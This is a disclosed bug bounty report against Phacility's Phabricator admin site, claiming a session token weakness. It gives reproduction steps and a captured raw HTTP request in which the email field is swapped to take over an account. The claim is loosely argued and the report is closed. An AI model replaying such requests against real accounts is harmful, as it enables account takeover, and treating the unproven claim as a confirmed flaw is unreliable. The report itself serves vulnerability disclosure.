# Broken Authentication and Session Management lead to take over account

## Report Details
- **Report ID**: 1271710
- **URL**: https://hackerone.com/reports/1271710
- **State**: Closed
- **Severity**: high
- **Submitted**: 2021-07-21T07:33:12.965Z
- **Disclosed**: 2021-07-21T16:32:52.928Z

## Reporter
- **Username**: thund3r17
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: phabricator

## Vulnerability Information
Hello, 
I found vulnerability using phone

Summary : 
Session token weakness, allowing attackers to take over accounts

Tools :
Lightning.apk (Browser) 
SandroProxy.apk or you can use all available proxies

Steps to Reproduce:
1) Create a phacility account.
2) Go to https://admin.phacility.com/settings/user/(username)/page/email/
3) Add new account
4) Open SandroProxy (Capture all http request) the request should look like this:

POST /settings/user/(username)/page/email/ HTTP/1.1
Host: admin.phacility.com
Connection: keep-alive
Content-Length: 157
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"
X-Phabricator-Csrf: B@5xu5frjn4f5238616917563d
sec-ch-ua-mobile: ?1
User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; vivo 1820) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36
X-Phabricator-Via: /settings/user/(username)/page/email/
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://admin.phacility.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate, br
Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,cs;q=0.6
Cookie: aura=u2FOcME6PSlT; admin_phusr=amer17; admin_phsid=ld7bdwzjadvg5x3go3wykgzj3blk3qrdidlqd452; halo=9LIv4U24kVpa

__csrf__=B%402hmxctpgc672d004d5b2cc5c&__form__=1&__dialog__=1&new=true&email=asuuu17%40gmail.com&__submit__=true&__wflow__=true&__ajax__=true&__metablock__=3

Pay attention (email=), change the victim's email to the attacker email with the same token, in this case the attacker can enter his email

## Impact

The weakness of the session token, allows the attacker to add his email and reset the password via the attacker's email

## Attachments
- poc.mp4
